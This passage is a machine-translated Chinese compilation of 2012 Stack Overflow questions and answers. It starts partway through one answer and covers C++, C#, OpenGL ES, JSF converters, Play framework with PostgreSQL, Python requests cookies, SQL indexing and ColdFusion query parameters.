SFINAE 用于模板。您需要的是使用模板，正如提到的其他答案，或者只是有一个编译时分支，IMO 是更合适的解决方案（而不是引入不必要的模板）：

```
struct is_64_bit :
    std::integral_constant<bool, sizeof(void*) == 8>
{};

namespace detail
{
    void my_memcpy(void* target, const void* source, std::size_t n, std::true_type)
    {
        std::cout << "64 bit memcpy" << std::endl;
    }

    void my_memcpy(void* target, const void* source, std::size_t n, std::false_type)
    {
        std::cout << "32 bit memcpy" << std::endl;
    }
}

void my_memcpy(void* target, const void* source, std::size_t n)
{
    my_memcpy(target, source, n, is_64_bit());
} 
```

# c# - 将常量映射到资源字符串以进行列表填充和查找

> ID：12624959
> 
> 赞同：3
> 
> 时间：2012-09-27T15:31:43.973
> 
> 标签：c#, asp.net, visual-studio-2010, localization, resource-files

在这里进行广泛搜索后，我仍然需要专家建议：

## 要求

要求非常标准：将 int consts 映射到资源文件中的字符串，这样本地化就可以正常工作，我们可以轻松地为当前用户语言的下拉列表创建值对列表，以及对 int 值进行反向查找。const 整数在不同的类中被定义为静态的。

所以，这里是它目前的实施方式，有些事情告诉我它可以更好，值得批评：

## 字典类：

```
public class TLiteralDic : Dictionary<int, string>
{
    //Lookup method
    public string getLiteral(int key)
    {
        if (ContainsKey(key)) {
            return this[key];
        }
        return string.Empty;
    }
} 
```

在靠近 UI 层的某个地方，填充下拉控件的扩展方法定义如下：

```
public static void fill(this TLiteralDic dic, DropDownList ddlst)
{
   ddlst.Items.Clear();
   foreach (KeyValuePair<int, string> v in dic) {
      ddlst.Items.Add(new ListItem(v.Value, v.Key.ToString()));
   }
} 
```

## 添加对（静态 const int 到资源文件中的字符串）：

```
public static class TLiterals
{

private static TLiteralDic _fileStatus;
public static TLiteralDic FileStatus
{
    get
    {
        if (_fileStatus == null) {
            _fileStatus = new TLiteralDic() {
                {TFiles.Status.Cancelled,   Lists.FileStatus_Cancelled},
                {TFiles.Status.Closed,      Lists.FileStatus_Closed},
                {TFiles.Status.OnHold,      Lists.FileStatus_OnHold},
                {TFiles.Status.Open,        Lists.FileStatus_Open},
                {TFiles.Status.Pending,     Lists.FileStatus_Pending},
                {TFiles.Status.Portal,      Lists.FileStatus_Portal}
            };
        }
        return _fileStatus;
    }
}

//... hundred of lists like that, short and long (up to 15 entries)

} 
```

## 在代码中使用

抬头：

```
textStatus.Text = TLiterals.FileStatus.getLiteral(row.FileStatus); 
```

清单填写：

```
TLiterals.FileStatus.fill(ddlstFileStatus); 
```

## 注意事项

这个想法是只有一个定义映射的地方，并且能够从中创建一个列表或通过 int 值进行查找。理想情况下具有良好的性能、最小的内存占用和编码麻烦。

已经考虑过以下替代方案：

*   使用 switch （过去用于查找 - 大量冗余代码）
*   使用反射
*   关闭
*   JSON、XML
*   在 VS2010 中使用 T4 类生成

到目前为止，还没有找到简单或明显更好的解决方案。

## 当前实施中的问题

*   围绕实际对列表的大量重复代码，理想情况下必须全部隐藏并重用
*   需要定义静态私有属性；这个想法是仅在第一次检索列表时才对列表使用“惰性”初始化。
*   在第一次使用后将文字保存在内存中对于这种简单的操作来说可能价格太高了

## 当前实施的优势

*   在一个地方定义的列表（与使用相同值对的 2 个不同地方的开关查找和手动列表填充相比）
*   重用代码进行查找和列表填充。
*   维护和编译时间检查的简单性。

关于更好的“漂亮代码”的任何想法？:)

理想情况下，我希望在定义列表时看到类似的内容，但在真正需要/使用之前不应初始化：

```
public static TLiteralDic FileStatus = new TLiteralDic () {
                {TFiles.Status.Cancelled,   Lists.FileStatus_Cancelled},
                {TFiles.Status.Closed,      Lists.FileStatus_Closed},
                {TFiles.Status.OnHold,      Lists.FileStatus_OnHold},
                {TFiles.Status.Open,        Lists.FileStatus_Open},
                {TFiles.Status.Pending,     Lists.FileStatus_Pending},
                {TFiles.Status.Portal,      Lists.FileStatus_Portal}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-18T17:34:06.630

> 在真正需要/使用之前，它不应该初始化：

你可以使用惰性实例化来做到这一点：

```
Lazy<Dictionary<string, string>> resources = new Lazy<Dictionary<string, string>>(() => new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)); 
```

对字典进行排序还可以帮助您加快搜索速度，例如使用 BinarySearch。

# iphone - OpenGL ES 2.0 透视投影 -> 立方体是矩形的

> ID：12624961
> 
> 赞同：1
> 
> 时间：2012-09-27T15:32:07.017
> 
> 标签：iphone, ios, opengl-es, opengl-es-2.0

**[已解决 - 请参阅底部的答案]**

*我正在尝试使用iOS (iPhone) 上的 OpenGL ES 2.0*绘制具有透视的立方体，但它显示为矩形。

从我在网上收集的信息来看，它似乎与视口/投影矩阵有关，但我似乎无法确定真正的原因。

如果我将视口设置为正方形（宽度 == 高度），它绘制得非常好（立方体），但如果我正确设置它（宽度 = 屏幕宽度，高度 = 屏幕高度），那么立方体被绘制为矩形形状。

是否应该使用视口相应地设置投影矩阵使立方体保持立方体？！

我的代码（如果需要更多信息，请告诉我）：

**渲染方法：**

```
// viewportSize is SCREEN_WIDTH and SCREEN_HEIGHT
// viewportLowerLeft is 0.0 and 0.0
ivec2 size = this->viewportSize;
ivec2 lowerLeft = this->viewportLowerLeft;
glViewport(lowerLeft.x, lowerLeft.y, size.x, size.y); // if I put size.x, size.x it draws well

mat4 projectionMatrix = mat4::FOVFrustum(45.0, 0.1, 100.0, size.x / size.y);

glUniformMatrix4fv(uniforms.Projection, 1, 0, projectionMatrix.Pointer()); 
```

**矩阵运算：**

```
static Matrix4<T> Frustum(T left, T right, T bottom, T top, T near, T far)
{
    T a = 2 * near / (right - left);
    T b = 2 * near / (top - bottom);
    T c = (right + left) / (right - left);
    T d = (top + bottom) / (top - bottom);
    T e = - (far + near) / (far - near);
    T f = -2 * far * near / (far - near);
    Matrix4 m;
    m.x.x = a; m.x.y = 0; m.x.z = 0; m.x.w = 0;
    m.y.x = 0; m.y.y = b; m.y.z = 0; m.y.w = 0;
    m.z.x = c; m.z.y = d; m.z.z = e; m.z.w = -1;
    m.w.x = 0; m.w.y = 0; m.w.z = f; m.w.w = 1;
    return m;
}
static Matrix4<T> FOVFrustum(T fieldOfView, T near, T far, T aspectRatio)
{
    T size = near * tanf(DEGREES_TO_RADIANS(fieldOfView) / 2.0);
    return Frustum(-size, size, -size / aspectRatio, size / aspectRatio, near, far);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T00:21:37.527

如果您还没有弄清楚这一点，请更改：

```
return Frustum(-size, size, -size / aspectRatio, size / aspectRatio, near, far); 
```

到

```
return Frustum(-size / aspectRatio, size / aspectRatio, -size, size,, near, far); 
```

它应该正确绘制。（或简单地将比例从 size.x/size.y 更改为 size.y/size.x）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:05:37.683

好的我发现了问题，size.x和size.y都是int，所以除法返回一个int。

```
1.0 * size.x / size.y 
```

解决问题。 *掌心*

# version-control - 如何备份 Plastic SCM 中的存储库？

> ID：12624965
> 
> 赞同：6
> 
> 时间：2012-09-27T15:32:15.753
> 
> 标签：version-control, backup, restore, plasticscm

如何备份 Plastic SCM 中的存储库？手动备份数据库就足够了吗？如果系统服务器崩溃，我将来可以恢复并开始使用存储库吗？或者有没有其他方法或接口来完成这项工作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T06:06:31.090

Plastic SCM (4.xw) 管理指南的“[备份和恢复](https://www.plasticscm.com/documentation/administration/plastic-scm-version-control-administrator-guide.shtml#Chapter9:Backupandrestore)”一章将对此进行介绍：

> 备份和恢复过程与 Plastic SCM 中使用的数据库后端密切相关

所以是的，备份数据库似乎就足够了。

# android - Android - 如何使用 Mediaplayer 类读取视频流

> ID：12624971
> 
> 赞同：2
> 
> 时间：2012-09-27T15:32:42.460
> 
> 标签：android, video, stream, media-player, buffer

在我当前的项目中，我们想在 Android 设备中预览外部摄像头。

我们已经通过 USB 连接了相机，并且我们正在我们的 Android 应用程序上接收视频流。

如何使用[mediaplayer 类](http://developer.android.com/reference/android/media/MediaPlayer.html)播放流？

相机能够发送我们想要的任何视频格式。

多谢你们 ！

PS：如果您有任何其他想法从外部摄像头预览视频，我会很高兴 :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-09T08:15:41.177

如果它对某人有帮助，我们已经找到了解决方案：

我们无法通过 USB 制作视频，但我们使用[rtsp 协议](http://developer.android.com/reference/android/media/MediaPlayer.html#setDataSource%28java.lang.String%29)通过 WIFI 发送视频流。

玩得开心 ！

# jsf - 未调用 getAsObject

> ID：12624975
> 
> 赞同：1
> 
> 时间：2012-09-27T15:33:11.507
> 
> 标签：jsf, jsf-2, converter

我想要做的是我正在获取`timeMillis`以毫秒为单位存储时间的属性（我得到了我的使用`System.currentTimeMillis()`），并在从当前时间减去它后将其转换为等效的天、小时、分钟和秒。主要问题是，每当调用转换器时，`timeConverter` 只`getAsString`调用函数，`getAsObject`而不调用。

这是我的 xhtml 文件中导致转换器无法正常运行的部分。

```
<c:forEach var="p" items="#{statusBean.statusList}">
    <h:form>
        <div class="status">
            <h:commandLink action="#{friendBean.gotoFriendProfile(p.email)}">
                <img src="../images/profilePicture/#{p.picture}" style="height: 29px; width: 29px; "/>
                <h:outputText value="#{p.statusBy}:"/>
            </h:commandLink>
            <h:outputText value="#{p.statusmsg}"/>
            <h:outputText value="#{p.timeMillis}">
                <f:converter converterId="timeConverter"/>
            </h:outputText>
            <br/>
            <c:forEach var="q" items="#{statusBean.commentList(p.statusId)}">
            <div class="barcomment">
                <br/>
                <h:commandLink action="#{friendBean.gotoFriendProfile(q.email)}">
                    <img src="../images/profilePicture/#{q.picture}" style="height: 29px; width: 29px; "/>
                    <h:outputText value="#{q.commentBy}:"/>
                </h:commandLink>
                <h:outputText value=" #{q.comment}"/>
            </div>
        </c:forEach>
        <br/>
        <div class="comment">
            <p:inputText value="#{statusBean.comment.comment}" styleClass="box"  />
            <p:commandLink  value="Views" action="#{statusBean.update(p.statusId)}" ajax="false" styleClass="link"/>
        </div> 
```

这是我编写的 timeConverter 类。

```
package com.converter;

import javax.faces.component.UIComponent;
import javax.faces.context.FacesContext;
import javax.faces.convert.Converter;

public class TimeConverter implements Converter {

    @Override
    public Object getAsObject(FacesContext arg0, UIComponent arg1, String arg2) {
        System.out.println("inside getAsObject");
        long time=Integer.parseInt(arg2);
        long currentTime=System.currentTimeMillis();
        long eclapseTime=time-currentTime;
        long secs=eclapseTime/1000;
        long days=secs/(60*60*24);
        long hours=(secs%(60*60*24))/60*60;
        long mins=(secs%(60*60*24)%(60*60))/60;
        long secs2=(secs%(60*60*24)%(60*60)%(60));
        StringBuffer sb = new StringBuffer();
        sb.append(days).append("days").append(hours).append("hours").append(mins).append("mins").append(secs2).append("secs");
        String object1 = sb.toString();
        return object1;
    }

    @Override
    public String getAsString(FacesContext context, UIComponent component,
            Object value) {
        System.out.println("inside getAsString");
        String value1 = value.toString();
        return value1;

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T19:32:29.287

为什么这是一个问题？

您仅在[`UIOutput`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIOutput.html)组件中使用转换器：

```
<h:outputText value="#{p.timeMillis}">
    <f:converter converterId="timeConverter"/>
</h:outputText> 
```

被`getAsString()`调用以将`Object`模型值转换为`String`可以嵌入到生成的 HTML 输出中的 a（您知道，您不能将 Java 对象简单地放在 HTML 字符串中）。

但是，您无法在[`UIInput`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIInput.html)类似的组件中使用它`<h:inputText>`，因此无法将提交的`String`值转换为模型中所需`Object`的值，因此`getAsObject()`显然永远不会调用。

一切都按设计工作。看起来您的具体问题是您*实际上*应该执行您在其中所做的`getAsObject()`工作`getAsString()`。

我认为如果你给这些方法一个更合理的参数名称会有所帮助：

```
@Override
public String getAsString(FacesContext context, UIComponent component, Object modelValue) throws ConverterException {
    // Write code here which converts the model value to display value.
    // This method will be used when generating HTML output.
}

@Override
public Object getAsObject(FacesContext context, UIComponent component, String submittedValue) throws ConverterException {
    // Write code here which converts the submitted value to model value.
    // This method will be used when processing submitted input values.
} 
```

# c# - 从 XmlNode 中提取“文本”值的最佳方法？

> ID：12624977
> 
> 赞同：2
> 
> 时间：2012-09-27T15:33:15.003
> 
> 标签：c#, xml, xmlnode

给定代码：

```
 var doc = new XmlDocument();
  doc.LoadXml(@"<a>
                    <b>test
                        <c>test2</c>
                    </b>
                </a>");
  var node = doc.SelectNodes("/a/b")[0]; 
```

然后我想提取`node b`- 在本例中为“test”的“文本”值，而不从所有子节点中检索所有文本元素（如 .`innerText`那样）

我发现自己求助于这段代码

```
 var elementText = node.ChildNodes.Cast<XmlNode>().First(a => a.NodeType == XmlNodeType.Text).Value; 
```

不幸`node.Value`的是，在这种情况下还有其他事情

有没有一种更整洁/内置的方式而不使用 linq 铸造？这不涉及我做类似的事情；

```
foreach (var childNode in node.ChildNodes)
   if (childNode.NodeType==XmlNodeType.Text)
    ... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:51:04.050

我更喜欢`XDocument`，`XmlDocument`我认为它更容易使用。您可以使用该方法轻松获取一个值`Element`，找到“b”元素，然后使用该`Value`属性。

```
using(var stream = new MemoryStream())
{
    using(var streamWriter = new StreamWriter(stream))
    {
        streamWriter.Write(@"<a>
                                 <b>test
                                     <c>test2</c>
                                 </b>
                             </a>");
        streamWriter.Flush();
        streamWriter.BaseStream.Seek(0, SeekOrigin.Begin);
        var doc = XDocument.Load(stream);
        Console.WriteLine(doc.Element("a").Element("b").FirstNode.ToString());
    }
} 
```

编辑：如评论中所述，这将得到不正确的值。我已经正确更新了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:42:49.730

您想使用 node.InnerText 而不是 Value。所以你会有这个：

```
 foreach(XmlNode child in node.ChildNodes)
 {
    if (string.IsNullOrEmpty(s))
    {
        s = child.InnerText;
    }
    else
    {
        s = s.Replace(child.InnerText, "");
    }
 }

   s.Trim(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:53:42.030

在 LINQ2XML 中，您可以这样做

```
foreach(XNode elm in doc.Descendants("b").OfType<XText>())
{
//elm has the text
} 
```

# playframework-1.x - play framework 和 postgresql 多模式

> ID：12624978
> 
> 赞同：0
> 
> 时间：2012-09-27T15:33:16.400
> 
> 标签：playframework-1.x

在我寻找一种处理多租户播放框架和 postgresql 模式的方法时，我在 [这里](https://stackoverflow.com/questions/8349267/hibernate-and-multi-tenant-database-using-schemas-in-postgresql)找到了这篇文章。
问题是我无法弄清楚我可以在游戏中执行普通 sql 语句的方式（我完全是菜鸟），有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T06:52:08.977

在游戏中，您拥有可以帮助您获取原始 jdbc 对象的 DB 对象。如果您的查询是没有参数的简单更新，您可以执行

```
DB.execute(simpleUpdate) 
```

如果您的查询是没有参数的简单选择，您可以执行

```
DB.executeQuery(simpleSelect) 
```

如果您有更复杂的参数，则可以通过直接获取连接来使用 PreparedStatement

```
PreparedStatement deleteStmt = DB.getConnection().prepareStatement(myStatement);
try {
    deleteStmt.setString(1, myString);
    deleteStmt.executeUpdate();
} finally {
    deleteStmt.close();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-04T15:01:59.000

我们使用模式对 Postgres 数据库进行分片。这是我们想出的解决方案。我们在 application.conf 中添加多个 DB 连接，并使用自定义 SQL 初始化连接。

```
# application.conf
db.default.driver=org.postgresql.Driver
db.default.url="jdbc:postgresql://localhost/mytest"
db.default.user=your_user
db.default.password=passwd
db.default.initSQL="SET timezone = 'UTC';"

db.tp0.driver=org.postgresql.Driver
db.tp0.url="jdbc:postgresql://localhost/mytest"
db.tp0.user=your_user
db.tp0.password=passwd
db.tp0.initSQL="SET search_path TO tp0, public;SET timezone = 'UTC';" 
```

**Java 代码**

```
EbeanServer tp0 = Ebean.getServer("tp0");
List<moneylog> res = tp0.find(moneylog.class).findList(); 
```

# python - Python 请求 - 保存 cookie 以供以后使用 url

> ID：12624980
> 
> 赞同：5
> 
> 时间：2012-09-27T15:33:21.143
> 
> 标签：python, python-2.7, python-requests

我一直在尝试获取 cookie 并将其发布到 url 以供以后在程序中使用，但我似乎无法让 cookie 参数正常工作。

现在我有

```
response = requests.get("url") 
```

但是我究竟如何从这个 url 中检索 cookie 并将它们发布到一个新的 url（相同的 cookie）。requests 中的教程对该主题有些模糊，并提供了我无法测试的示例。希望有人可以帮助提供更多示例。

这是python 2.7顺便说一句。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-27T15:36:40.037

您想使用[会话](https://requests.readthedocs.io/en/latest/user/advanced/#session-objects)：

```
s = requests.session()

response = s.get('url') 
```

您可以像使用`requests`模块一样使用会话（它具有相同的方法），但它会为您保留 cookie 并在将来的请求中发送它们。

# c++ - 为什么对象属性的值在将其指针添加到c ++中的映射后返回零

> ID：12624983
> 
> 赞同：-1
> 
> 时间：2012-09-27T15:33:40.177
> 
> 标签：c++, memory, pointers, map, vector

所以我有这个：

```
//sons is an attribute of the object node that is a vector<Node*> that is initialized before
map<string,Node*> nodes;
string node_id = "node";
string son_id = "son";

Node *node = new Node(node_id, matrix, son_id, Prim);
cout << "Before " << node << endl;
cout << "Value of sons before map: " << node->sons[0] << endl;

nodes[node_id] = node;

cout << "After: " << nodes.find(node_id)->second << endl;
cout << "Value of sons after map: " << nodes.find(node_id)->second->sons[0]; 
```

我得到这个输出（从执行到执行的内存位置不同）：

```
Before: 0x9dfdda8
Value of sons before map: 0xbff1a774 // consistant with memory position with created obj
After: 0x9dfdda8
Value of sons after map: 0 
```

为什么会发生这种情况，我该如何解决？！我一直在寻找解决方案并试图解决这个问题 4 个小时...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:37:46.417

```
cout << "After: " << nodes.find(root_id)->second << endl;
cout << "Value of sons after map: " << nos.find(root_id)->second->sons[0]; 
```

为什么第二行指的是第一`nos`行`nodes`？这只是一个错字吗？

如果这些确实是不同的对象，那可能可以解释为什么您会看到不一致的结果

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:38:38.597

您正在添加`node`到`map`with 键`node_id`，然后稍后查找它，`root_id`甚至不检查它是否找到一个，因此您可能通过访问`end(nodes)`. 您需要使用相同的键访问地图以获取相同的对象。

`no`此外，`nos`当您显然需要访问其中一个`node`或地图的变量时，您似乎对您的变量有些困惑。

# sql - 数据库索引——它们应该是什么

> ID：12624990
> 
> 赞同：1
> 
> 时间：2012-09-27T15:34:02.023
> 
> 标签：sql, database-design, optimization

我的大多数数据库表都有一个明确的唯一索引，90% 的时间都通过该索引完成查找，但我对此有点不确定 - 我有一个表可以跟踪数据库中项目的用户评分总数，我现在想要添加另一个表，使用 ip 地址列跟踪个人评级，以确保没有人可以对某事进行两次评级。因为我可以看到这成为一个大的、高使用率的表，所以正确优化它很重要。（MYSQL 表）

该表将包含以下字段：

rating_id（总是 - 唯一），item_id（总是 - 非唯一），user_id（可选 - 非唯一），ip_address（总是 - 非唯一），rating_value（总是 - 非唯一），has_review（布尔）

现在我设想 90% 的查询是这样的：

当用户评价某物时 - 选择 item_id = x 和 ip_address = y，（如果 rows = 0）插入评价

在用户帐户页面中 - 选择 ip_address = x 或 username = y

现在搜索到的所有字段都不是唯一的，我是否仍然可以将它们用作索引（例如 item _id 和 ip_address），我可以有两个索引并且这仍然会提高非索引表的性能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T15:36:22.010

您可以拥有唯一或不唯一的索引。一个表上可以有多个索引。您还可以一次在多个字段上创建索引。

一般来说，如果使用得当，这些将提高*查询*性能，尽管这可能会以插入性能为代价。

如果要显示聚合评分，则可以通过定期计算评分结果并将结果缓存在数据库或应用程序中来获得更好的性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:40:04.640

每个数据库系统都有不同类型的索引。一般来说，他们构建第二个数据结构（如树或哈希图，但我不知道细节太好了，说实话）以加快查找速度。

因此，通过索引您的表可能是有意义的`username`，`ip-adress`以便非常快速地使用这些字段执行查询。请记住，修改数据往往很慢，因为索引也必须更新。

# coldfusion - 使用 cfscript 在查询对象 addParam 中投射日期的问题

> ID：12624994
> 
> 赞同：0
> 
> 时间：2012-09-27T15:34:19.710
> 
> 标签：coldfusion, coldfusion-9

我正在使用`cfscript`语法创建一个查询，并且我有两个查询参数是日期。我第一次使用创建了日期字符串

```
queryservice.addParam(
     name="last_update",
     value="createODBCDate(now())",
     cfsqltype="cf_sql_date"); 
```

我认为这将类似于：

```
<cfqueryparam value="#createODBCDate(now())#" cfsqltype="cf_sql_date"> 
```

所以，当我运行查询时，我得到：

```
The cause of this output exception was that: coldfusion.runtime.Cast$DateStringConversionException: The value createODBCDate(now()) cannot be converted to a date. 
```

美好的。所以我创建了一个变量，

```
var currentDate = createODBCDate(now()); 
```

将其添加到

```
queryservice.addParam(
     name="last_update",
     value="createODBCDate(now())",
     cfsqltype="cf_sql_date"); 
```

并得到

```
The cause of this output exception was that: coldfusion.runtime.Cast$DateStringConversionException: The value currentDate cannot be converted to a date. 
```

当我使用标准`<cfquery ...`语法创建查询时，它运行良好。

所以，我假设我做错了什么，但我无法终生弄清楚那是什么。

顺便说一句，这真的是我第一次尝试使用`<cfscript>`语法创建查询。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T15:47:39.290

> `value="createODBCDate(now())"`

您忘记了函数周围的 # 符号。没有这些，它只是一个字符串。因此，该函数永远不会被调用，并且您最终将文字字符“createODBCDate(now())”作为 date 传递`value`。

**更新：**

顺便说一句，`cf_sql_date`自动删除任何时间部分。因此，虽然使用`createODBCDate`不会伤害任何东西，但它是多余的。你可以简单地写：

```
 queryservice.addParam(
         name="last_update",
         value="#now()#",
         cfsqltype="cf_sql_date"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:51:35.463

您的第二次尝试需要#，就像@Leigh 提到的那样，也没有引用您创建的变量“currentDate”。